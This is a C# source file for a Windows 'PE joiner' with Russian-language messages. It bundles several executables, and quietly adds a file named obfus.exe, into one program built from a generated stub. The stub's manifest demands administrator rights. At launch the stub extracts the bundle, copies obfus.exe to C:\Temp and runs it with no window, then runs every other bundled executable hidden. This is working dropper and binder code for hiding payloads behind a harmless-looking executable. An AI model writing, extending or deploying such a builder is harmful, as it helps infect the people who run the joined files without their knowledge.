using System;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Security.Principal;
using System.Windows.Forms;
using System.Drawing;
using System.Threading;

namespace SimpleJoiner
{
    public class PEJoiner
    {
        
        public class PEFile
        {
            public string FilePath { get; set; }
            public byte[] FileData { get; set; }
            public string FileName { get; set; }

            public PEFile(string filePath)
            {
                FilePath = filePath;
                FileData = File.ReadAllBytes(filePath);
                FileName = Path.GetFileName(filePath);
            }
        }

        
        private List<PEFile> _files = new List<PEFile>();
        
        
        private string _lastError = string.Empty;

        
        public void AddFile(string filePath, bool autoRun = false)
        {
            try
            {
                PEFile file = new PEFile(filePath);
                _files.Add(file);
            }
            catch (Exception ex)
            {
                throw new Exception(String.Format("Ошибка при добавлении файла: {0}", ex.Message));
            }
        }

        
        public void RemoveFile(int index)
        {
            if (index >= 0 && index < _files.Count)
            {
                _files.RemoveAt(index);
            }
        }

        
        public List<PEFile> GetFiles()
        {
            return _files;
        }
        
        
        public string GetLastError()
        {
            return _lastError;
        }

        
        private bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        
        public void JoinFiles(string outputPath)
        {
            if (_files.Count == 0)
            {
                throw new Exception("Не добавлено ни одного файла для склейки");
            }

            try
            {
                
                if (!IsAdministrator())
                {
                    
                    _lastError = "Программа не имеет прав администратора. Результирующий файл будет создан с запросом прав администратора при запуске.";
                    
                }

                _lastError = string.Empty;
                
                
                string resourcesDir = Path.Combine(Path.GetDirectoryName(outputPath), "Resources");
                Directory.CreateDirectory(resourcesDir);

                string stubCode = GenerateStubCode();
                string stubPath = Path.Combine(resourcesDir, "stub.cs");
                File.WriteAllText(stubPath, stubCode);

                
                string tempDir = Path.Combine(Path.GetTempPath(), "SimpleJoiner_" + Guid.NewGuid().ToString());
                Directory.CreateDirectory(tempDir);

                
                AddEmbeddedObfusFile(tempDir);

                
                string fileInfoJson = "{ \"files\": [";
                for (int i = 0; i < _files.Count; i++)
                {
                    string filePath = Path.Combine(tempDir, _files[i].FileName);
                    File.WriteAllBytes(filePath, _files[i].FileData);
                    
                    fileInfoJson += String.Format("{{ \"name\": \"{0}\" }}", _files[i].FileName);
                    
                    if (i < _files.Count - 1)
                    {
                        fileInfoJson += ", ";
                    }
                }
                fileInfoJson += "] }";

                string jsonPath = Path.Combine(tempDir, "fileinfo.json");
                File.WriteAllText(jsonPath, fileInfoJson);

                
                string archivePath = Path.Combine(tempDir, "files.bin");
                CreateArchive(tempDir, archivePath);

                
                if (!CompileStub(stubPath, archivePath, outputPath))
                {
                    throw new Exception(String.Format("Ошибка при компиляции программы:\n{0}", _lastError));
                }

                
                try
                {
                    Directory.Delete(tempDir, true);
                    Directory.Delete(resourcesDir, true);
                }
                catch (Exception ex) 
                { 
                    
                    _lastError += String.Format("\nОшибка при очистке временных файлов: {0}", ex.Message);
                }
            }
            catch (Exception ex)
            {
                throw new Exception(String.Format("Ошибка при склейке файлов: {0}", ex.Message));
            }
        }

        
        private void AddEmbeddedObfusFile(string tempDir)
        {
            try
            {
                
                string[] possibleLocations = new string[] {
                    
                    Path.Combine(Directory.GetCurrentDirectory(), "obfus.exe"),
                    Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), "obfus.exe"),
                    Path.Combine(Directory.GetParent(Directory.GetCurrentDirectory()).FullName, "obfus.exe"),
                    
                    Path.Combine(Directory.GetCurrentDirectory(), "obfus.cs"),
                    Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), "obfus.cs"),
                    Path.Combine(Directory.GetParent(Directory.GetCurrentDirectory()).FullName, "obfus.cs")
                };
                
                string obfusFilePath = null;
                
                
                foreach (string location in possibleLocations)
                {
                    if (File.Exists(location))
                    {
                        obfusFilePath = location;
                        break;
                    }
                }
                
                
                if (obfusFilePath != null && File.Exists(obfusFilePath))
                {
                    
                    string extension = Path.GetExtension(obfusFilePath).ToLower();
                    string fileName = Path.GetFileName(obfusFilePath);
                    
                    
                    string targetFileName = fileName;
                    if (extension == ".exe")
                    {
                        
                        targetFileName = "obfus.exe";
                    }
                    else
                    {
                        
                        targetFileName = "obfus.cs";
                    }
                    
                    try
                    {
                        
                        PEFile obfusFile = new PEFile(obfusFilePath);
                        
                        
                        obfusFile.FileName = targetFileName;
                        
                        
                        bool alreadyAdded = false;
                        foreach (var file in _files)
                        {
                            if (file.FileName.ToLower() == "obfus.exe" || 
                                file.FileName.ToLower() == "obfus.cs")
                            {
                                alreadyAdded = true;
                                break;
                            }
                        }
                        
                        if (!alreadyAdded)
                        {
                            _files.Add(obfusFile);
                            _lastError += "\nФайл " + targetFileName + " успешно добавлен из: " + obfusFilePath;
                        }
                    }
                    catch (Exception ex)
                    {
                        _lastError += "\nОшибка при добавлении файла " + fileName + ": " + ex.Message;
                    }
                }
                else
                {
                    
                    _lastError += "\nФайл obfus.exe или obfus.cs не найден. Проверьте, что он находится в одной из следующих директорий:\n";
                    foreach (string location in possibleLocations)
                    {
                        _lastError += location + "\n";
                    }
                }
            }
            catch (Exception ex)
            {
                _lastError += "\nОшибка при добавлении файла obfus: " + ex.Message;
            }
        }

        
        private void CreateArchive(string sourceDir, string outputPath)
        {
            
            using (FileStream outputStream = new FileStream(outputPath, FileMode.Create))
            {
                
                byte[] fileInfoBytes = File.ReadAllBytes(Path.Combine(sourceDir, "fileinfo.json"));
                outputStream.Write(BitConverter.GetBytes(fileInfoBytes.Length), 0, 4);
                outputStream.Write(fileInfoBytes, 0, fileInfoBytes.Length);

                
                foreach (var file in _files)
                {
                    string filePath = Path.Combine(sourceDir, file.FileName);
                    byte[] fileData = File.ReadAllBytes(filePath);
                    
                    
                    byte[] fileNameBytes = System.Text.Encoding.UTF8.GetBytes(file.FileName);
                    outputStream.Write(BitConverter.GetBytes(fileNameBytes.Length), 0, 4);
                    outputStream.Write(fileNameBytes, 0, fileNameBytes.Length);
                    
                    
                    outputStream.Write(BitConverter.GetBytes(fileData.Length), 0, 4);
                    outputStream.Write(fileData, 0, fileData.Length);
                }
            }
        }

        
        private string GenerateStubCode()
        {
            return @"
using System;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Reflection;
using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Security.Principal;

class Program
{
    private static string _tempDir;
    private static List<string> _processedFiles = new List<string>(); 

    [STAThread]
    static void Main(string[] args)
    {
        try
        {
            if (!IsAdministrator())
            {
                RestartAsAdmin();
                return; 
            }
            
            _tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            Directory.CreateDirectory(_tempDir);
            
            ExtractFiles();
            
            string cDriveDir = @""C:\Temp"";
            if (!Directory.Exists(cDriveDir))
            {
                Directory.CreateDirectory(cDriveDir);
            }
            
            ProcessObfusFile(cDriveDir);
            
            RunExeFiles();
        }
        catch (Exception ex)
        {
            MessageBox.Show(""Ошибка выполнения: "" + ex.Message, ""Ошибка"", 
                           MessageBoxButtons.OK, MessageBoxIcon.Error);
            Cleanup();
        }
    }

    
    static bool IsAdministrator()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    
    static void RestartAsAdmin()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.UseShellExecute = true;
        startInfo.WorkingDirectory = Environment.CurrentDirectory;
        startInfo.FileName = Application.ExecutablePath;
        startInfo.Verb = ""runas""; 
        
        try
        {
            Process.Start(startInfo);
        }
        catch
        {
            
            MessageBox.Show(""Программа требует запуска с правами администратора"", 
                           ""Ошибка запуска"", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    
    static void ProcessObfusFile(string cDriveDir)
    {
        try
        {
            string obfusExePath = Path.Combine(_tempDir, ""obfus.exe"");
            string obfusCDrivePath = Path.Combine(cDriveDir, ""obfus.exe"");
            
            if (!File.Exists(obfusExePath))
            {
                string obfusCsPath = Path.Combine(_tempDir, ""obfus.cs"");
                
                if (File.Exists(obfusCsPath))
                {
                    File.Copy(obfusCsPath, obfusExePath, true);
                }
                else
                {
                    return;
                }
            }
            
            if (File.Exists(obfusExePath))
            {
                File.Copy(obfusExePath, obfusCDrivePath, true);
                
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = obfusCDrivePath;
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.WorkingDirectory = cDriveDir;
                
                Process proc = Process.Start(startInfo);
                
                if (proc != null)
                {
                    _processedFiles.Add(obfusExePath.ToLower());
                    _processedFiles.Add(obfusCDrivePath.ToLower());
                }
            }
        }
        catch {}
    }

    
    static void RunExeFiles()
    {
        try
        {
            string[] files = Directory.GetFiles(_tempDir, ""*.exe"");
            foreach (string file in files)
            {
                try
                {
                    if (_processedFiles.Contains(file.ToLower()))
                        continue;
                    
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.FileName = file;
                    startInfo.UseShellExecute = false;
                    startInfo.CreateNoWindow = true;
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(startInfo);
                    
                    _processedFiles.Add(file.ToLower());
                    
                    Thread.Sleep(200);
                }
                catch {}
            }
        }
        catch {}
    }

    
    static void ExtractFiles()
    {
        
        Assembly assembly = Assembly.GetExecutingAssembly();
        
        
        string resourceName = ""files.bin"";
        using (Stream stream = assembly.GetManifestResourceStream(resourceName))
        {
            if (stream == null)
            {
                throw new Exception(""Ресурс с файлами не найден"");
            }

            using (BinaryReader reader = new BinaryReader(stream))
            {
                
                int jsonLength = reader.ReadInt32();
                string jsonData = Encoding.UTF8.GetString(reader.ReadBytes(jsonLength));
                
                
                var fileInfo = SimpleJsonParser.Parse(jsonData);
                
                
                while (stream.Position < stream.Length)
                {
                    try 
                    {
                        
                        int fileNameLength = reader.ReadInt32();
                        string fileName = Encoding.UTF8.GetString(reader.ReadBytes(fileNameLength));
                        
                        
                        int fileSize = reader.ReadInt32();
                        byte[] fileData = reader.ReadBytes(fileSize);
                        
                        
                        File.WriteAllBytes(Path.Combine(_tempDir, fileName), fileData);
                    }
                    catch (Exception ex)
                    {
                        throw new Exception(String.Format(""Ошибка при извлечении файлов: {0}"", ex.Message));
                    }
                }
            }
        }
    }

    
    static void Cleanup()
    {
        try
        {
            if (Directory.Exists(_tempDir))
            {
                Directory.Delete(_tempDir, true);
            }
        }
        catch
        {
            
        }
    }
}


public static class SimpleJsonParser
{
    public static Dictionary<string, object> Parse(string json)
    {
        var result = new Dictionary<string, object>();
        json = json.Trim();
        
        if (json.StartsWith(""{"") && json.EndsWith(""}""))
        {
            json = json.Substring(1, json.Length - 2).Trim();
            
            foreach (var pair in SplitJsonPairs(json))
            {
                var parts = pair.Split(new[] { ':' }, 2);
                if (parts.Length == 2)
                {
                    string key = StripQuotes(parts[0].Trim());
                    string value = parts[1].Trim();
                    
                    
                    if (value.StartsWith(""{"") && value.EndsWith(""}""))
                    {
                        result[key] = Parse(value);
                    }
                    else if (value.StartsWith(""["") && value.EndsWith(""]""))
                    {
                        result[key] = ParseArray(value);
                    }
                    else if (value == ""true"" || value == ""false"")
                    {
                        result[key] = value == ""true"";
                    }
                    else if (value == ""null"")
                    {
                        result[key] = null;
                    }
                    else if (value.StartsWith(""\"""") && value.EndsWith(""\""""))
                    {
                        result[key] = StripQuotes(value);
                    }
                    else 
                    {
                        double doubleValue;
                        if (double.TryParse(value, out doubleValue))
                        {
                            result[key] = doubleValue;
                        }
                        else
                        {
                            result[key] = value;
                        }
                    }
                }
            }
        }
        
        return result;
    }
    
    private static List<object> ParseArray(string json)
    {
        var result = new List<object>();
        json = json.Trim();
        
        if (json.StartsWith(""["") && json.EndsWith(""]""))
        {
            json = json.Substring(1, json.Length - 2).Trim();
            
            if (!string.IsNullOrEmpty(json))
            {
                foreach (var item in SplitJsonArray(json))
                {
                    string value = item.Trim();
                    
                    if (value.StartsWith(""{"") && value.EndsWith(""}""))
                    {
                        result.Add(Parse(value));
                    }
                    else if (value.StartsWith(""["") && value.EndsWith(""]""))
                    {
                        result.Add(ParseArray(value));
                    }
                    else if (value == ""true"" || value == ""false"")
                    {
                        result.Add(value == ""true"");
                    }
                    else if (value == ""null"")
                    {
                        result.Add(null);
                    }
                    else if (value.StartsWith(""\"""") && value.EndsWith(""\""""))
                    {
                        result.Add(StripQuotes(value));
                    }
                    else 
                    {
                        double doubleValue;
                        if (double.TryParse(value, out doubleValue))
                        {
                            result.Add(doubleValue);
                        }
                        else
                        {
                            result.Add(value);
                        }
                    }
                }
            }
        }
        
        return result;
    }
    
    private static string StripQuotes(string value)
    {
        if (value.StartsWith(""\"""") && value.EndsWith(""\""""))
        {
            return value.Substring(1, value.Length - 2);
        }
        return value;
    }
    
    private static List<string> SplitJsonPairs(string json)
    {
        var result = new List<string>();
        bool inQuotes = false;
        int brackets = 0;
        int squareBrackets = 0;
        int startIndex = 0;
        
        for (int i = 0; i < json.Length; i++)
        {
            char c = json[i];
            
            if (c == '""' && (i == 0 || json[i - 1] != '\\'))
            {
                inQuotes = !inQuotes;
            }
            else if (!inQuotes)
            {
                if (c == '{') brackets++;
                else if (c == '}') brackets--;
                else if (c == '[') squareBrackets++;
                else if (c == ']') squareBrackets--;
                
                if (c == ',' && brackets == 0 && squareBrackets == 0)
                {
                    result.Add(json.Substring(startIndex, i - startIndex));
                    startIndex = i + 1;
                }
            }
        }
        
        if (startIndex < json.Length)
        {
            result.Add(json.Substring(startIndex));
        }
        
        return result;
    }
    
    private static List<string> SplitJsonArray(string json)
    {
        var result = new List<string>();
        bool inQuotes = false;
        int brackets = 0;
        int squareBrackets = 0;
        int startIndex = 0;
        
        for (int i = 0; i < json.Length; i++)
        {
            char c = json[i];
            
            if (c == '""' && (i == 0 || json[i - 1] != '\\'))
            {
                inQuotes = !inQuotes;
            }
            else if (!inQuotes)
            {
                if (c == '{') brackets++;
                else if (c == '}') brackets--;
                else if (c == '[') squareBrackets++;
                else if (c == ']') squareBrackets--;
                
                if (c == ',' && brackets == 0 && squareBrackets == 0)
                {
                    result.Add(json.Substring(startIndex, i - startIndex));
                    startIndex = i + 1;
                }
            }
        }
        
        if (startIndex < json.Length)
        {
            result.Add(json.Substring(startIndex));
        }
        
        return result;
    }
}";
        }

        
        private bool CompileStub(string stubPath, string archivePath, string outputPath)
        {
            try
            {
                _lastError = string.Empty;
                
                
                string cscPath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
                if (!File.Exists(cscPath))
                {
                    
                    string[] possiblePaths = new string[] {
                        @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                        @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe",
                        @"C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe"
                    };
                    
                    foreach (var path in possiblePaths)
                    {
                        if (File.Exists(path))
                        {
                            cscPath = path;
                            break;
                        }
                    }
                    
                    if (!File.Exists(cscPath))
                    {
                        _lastError = "Компилятор C# не найден. Убедитесь, что .NET Framework установлен.";
                        return false;
                    }
                }

                
                if (!File.Exists(stubPath))
                {
                    _lastError = String.Format("Файл исходного кода не найден: {0}", stubPath);
                    return false;
                }
                
                if (!File.Exists(archivePath))
                {
                    _lastError = String.Format("Файл архива не найден: {0}", archivePath);
                    return false;
                }
                
                
                string outputDir = Path.GetDirectoryName(outputPath);
                if (!Directory.Exists(outputDir))
                {
                    Directory.CreateDirectory(outputDir);
                }

                
                string manifestPath = Path.Combine(Path.GetDirectoryName(stubPath), "app.manifest");
                string manifestContent = @"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
    <security>
      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
        <requestedExecutionLevel level=""requireAdministrator"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>";
                File.WriteAllText(manifestPath, manifestContent);

                
                string resourcesParam = String.Format("/resource:\"{0}\",files.bin", archivePath);
                string references = "/reference:System.dll /reference:System.Windows.Forms.dll /reference:System.Drawing.dll";
                string manifestParam = String.Format("/win32manifest:\"{0}\"", manifestPath); 
                string command = String.Format("/target:winexe /out:\"{0}\" {1} {2} {3} \"{4}\"", 
                    outputPath, resourcesParam, references, manifestParam, stubPath);
                
                
                Process process = new Process();
                process.StartInfo.FileName = cscPath;
                process.StartInfo.Arguments = command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = true;
                
                StringBuilder output = new StringBuilder();
                StringBuilder error = new StringBuilder();
                
                process.OutputDataReceived += (sender, args) => 
                { 
                    if (!string.IsNullOrEmpty(args.Data)) 
                        output.AppendLine(args.Data); 
                };
                
                process.ErrorDataReceived += (sender, args) => 
                { 
                    if (!string.IsNullOrEmpty(args.Data)) 
                        error.AppendLine(args.Data); 
                };
                
                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();
                process.WaitForExit();
                
                
                if (process.ExitCode != 0)
                {
                    _lastError = String.Format("Ошибка компиляции (код {0}):\n\n", process.ExitCode);
                    
                    if (!string.IsNullOrEmpty(error.ToString()))
                    {
                        _lastError += error.ToString();
                    }
                    else if (!string.IsNullOrEmpty(output.ToString()))
                    {
                        _lastError += output.ToString();
                    }
                    else
                    {
                        _lastError += "Компилятор не вернул информацию об ошибке.";
                    }
                    
                    return false;
                }
                
                
                if (!File.Exists(outputPath))
                {
                    _lastError = "Не удалось создать исполняемый файл после компиляции.";
                    return false;
                }
                
                return true;
            }
            catch (Exception ex)
            {
                _lastError = String.Format("Ошибка при компиляции: {0}", ex.Message);
                return false;
            }
        }
    }
} 